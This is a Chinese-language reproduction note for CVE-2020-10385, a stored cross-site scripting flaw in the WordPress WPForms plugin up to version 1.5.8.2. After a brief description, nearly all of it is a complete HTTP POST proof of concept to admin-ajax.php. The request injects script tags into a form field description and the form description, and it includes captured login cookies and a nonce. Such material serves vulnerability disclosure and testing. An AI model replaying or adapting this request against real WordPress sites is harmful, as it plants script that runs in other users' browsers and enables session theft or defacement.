---
title: （CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss
id: zhfly3255
---

# （CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss

## 一、漏洞简介

WordPress WPForms Contact Form 1.5.9之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。

## 二、漏洞影响

Version: 1.5.8.2 and below

## 三、复现过程

### poc

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.0-sec.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.0-sec.org/wp-admin/admin.php?page=wpforms-builder&view=settings&form_id=23
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 3140
Origin: http://www.0-sec.org
Connection: close
Cookie: wp-saving-post=15-saved; wordpress_db156a460ca831632324809820a538ce=jinson%7C1582145873%7CBKGMGaw77TcSEz7kE0ijBd8VfAq7KwALhBVfKNRbKst%7Cf826697f923b7f17c30049eea275c6523b7e2418ab354e106c50f0314b9bdae9; comment_author_email_db156a460ca831632324809820a538ce=dev-email@flywheel.local; comment_author_db156a460ca831632324809820a538ce=jinson; wp-settings-time-1=1581973079; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_db156a460ca831632324809820a538ce=jinson%7C1582145873%7CBKGMGaw77TcSEz7kE0ijBd8VfAq7KwALhBVfKNRbKst%7Cbaecd49d797bff21499da712891744737c67fd481d59e04a952554579f26c637 `action=wpforms_save_form&data=%5B%7B%22name%22%3A%22id%22%2C%22value%22%3A%2223%22%7D%2C%7B%22name%22%3A%22field_id%22%2C%22value%22%3A%2213%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bid%5D%22%2C%22value%22%3A%2211%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Btype%5D%22%2C%22value%22%3A%22text%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Blabel%5D%22%2C%22value%22%3A%22Single+Line+Text%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bdescription%5D%22%2C%22value%22%3A%22%3Cscript%3Ealert(%5C%22XSS+on+form+description%5C%22)%3C%2Fscript%3E%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bsize%5D%22%2C%22value%22%3A%22medium%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bplaceholder%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Blimit_count%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Blimit_mode%5D%22%2C%22value%22%3A%22characters%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bdefault_value%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Bcss%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22fields%5B11%5D%5Binput_mask%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bform_title%5D%22%2C%22value%22%3A%22Security+Test+WPForms%22%7D%2C%7B%22name%22%3A%22settings%5Bform_desc%5D%22%2C%22value%22%3A%22%3Cscript%3Ealert(%5C%22XSS+on+form+description+2%5C%22)%3C%2Fscript%3E%22%7D%2C%7B%22name%22%3A%22settings%5Bform_class%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bsubmit_text%5D%22%2C%22value%22%3A%22Submit%22%7D%2C%7B%22name%22%3A%22settings%5Bsubmit_text_processing%5D%22%2C%22value%22%3A%22Sending…%22%7D%2C%7B%22name%22%3A%22settings%5Bsubmit_class%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bhoneypot%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22settings%5Bnotification_enable%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bemail%5D%22%2C%22value%22%3A%22%7Badmin_email%7D%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bsubject%5D%22%2C%22value%22%3A%22New+Security+Test+WPForms+Entry%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bsender_name%5D%22%2C%22value%22%3A%22ptest%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bsender_address%5D%22%2C%22value%22%3A%22%7Badmin_email%7D%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Breplyto%5D%22%2C%22value%22%3A%22%22%7D%2C%7B%22name%22%3A%22settings%5Bnotifications%5D%5B1%5D%5Bmessage%5D%22%2C%22value%22%3A%22%7Ball_fields%7D%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Btype%5D%22%2C%22value%22%3A%22message%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bmessage%5D%22%2C%22value%22%3A%22%3Cp%3EThanks+for+contacting+us!+We+will+be+in+touch+with+you+shortly.%3C%2Fp%3E%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bmessage_scroll%5D%22%2C%22value%22%3A%221%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bpage%5D%22%2C%22value%22%3A%222%22%7D%2C%7B%22name%22%3A%22settings%5Bconfirmations%5D%5B1%5D%5Bredirect%5D%22%2C%22value%22%3A%22%22%7D%5D&id=23&nonce=938cf431d2` 
```